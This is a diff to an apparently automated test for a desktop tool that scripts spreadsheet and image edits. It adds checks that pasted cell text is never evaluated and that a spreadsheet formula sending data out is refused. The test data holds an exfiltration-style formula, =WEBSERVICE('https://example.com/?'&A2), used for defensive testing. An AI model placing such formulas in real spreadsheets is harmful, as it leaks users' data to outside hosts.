@@ -146,9 +146,15 @@ assert.equal(alive.result, 2);
 // converted with a private profile so it never goes through the open Writer.
 const sheet = `${directory}/budget.ods`;
 await execute("/usr/sbin/runuser", ["-u", "openwork-browser", "--", "sh", "-c", 'cd "$1" && printf "Item,Cost\\n" > budget.csv && soffice -env:UserInstallation=file:///tmp/openwork-proof-office --headless --convert-to ods budget.csv >/dev/null && convert -size 120x80 xc:steelblue photo.png && printf "<svg xmlns=\\"http://www.w3.org/2000/svg\\" width=\\"100\\" height=\\"50\\"><rect width=\\"100\\" height=\\"50\\" fill=\\"red\\"/></svg>" > shape.svg', "_", directory], { timeout: 60_000 });
-const written = await applications.script({ app: "calc", operation: "write_range", path: sheet, range: "A2:B3", values: [["Paint", 12.5], ["Total", "=B2*2"]] }, deadline);
+const written = await applications.script({ app: "calc", operation: "write_range", path: sheet, range: "A2:B3", values: [["Paint", 12.5], ["Total", { formula: "=B2*2" }]] }, deadline);
 assert.deepEqual(written.changed.map(change => change.cell), ["A2", "B2", "A3", "B3"]);
 assert.equal(written.values[1][1], 25);
+// Cell text from pages or files is never evaluated, and formulas cannot send data out.
+const pasted = await applications.script({ app: "calc", operation: "write_range", path: sheet, range: "C2", values: [['=WEBSERVICE("https://example.com/?"&A2)']] }, deadline);
+assert.equal(pasted.values[0][0], '=WEBSERVICE("https://example.com/?"&A2)');
+const fetching = await applications.script({ app: "calc", operation: "write_range", path: sheet, range: "D2:D3", values: [[{ formula: "=1+1" }], [{ formula: '=WEBSERVICE("https://example.com/?"&A2)' }]] }, deadline);
+assert.equal(fetching.ok, false);
+assert.deepEqual((await applications.script({ app: "calc", operation: "read_range", path: sheet, range: "D2" }, deadline)).values, [[""]], "a refused formula leaves the sheet untouched");
 const pdf = await applications.script({ app: "calc", operation: "export_pdf", path: sheet, output: `${directory}/budget.pdf` }, deadline);
 assert.ok(pdf.bytes > 1000);
 const photo = await applications.script({ app: "gimp", path: `${directory}/photo.png`, output: `${directory}/photo.jpg`, width: 64, rotate: 90 }, deadline);
